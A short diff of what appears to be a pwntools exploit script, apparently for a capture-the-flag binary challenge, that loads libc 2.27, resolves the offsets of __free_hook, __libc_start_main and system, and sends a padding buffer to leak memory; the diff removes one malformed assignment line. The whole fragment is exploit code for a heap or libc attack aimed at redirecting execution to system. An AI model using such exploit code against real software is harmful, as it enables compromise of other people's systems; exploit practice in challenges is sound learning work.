@@ -9,7 +9,6 @@ libc = ELF("./libc-2.27.so")
 free_hook_offset = libc.symbols['__free_hook']
 libc_start_main_offset = libc.symbols['__libc_start_main']
 system_offset = libc.symbols['system']
- = 0x1b3e1a
 
 p.sendafter(b"Buf: ", b"a"*0x48)
 p.recvuntil(b"a"*0x48)
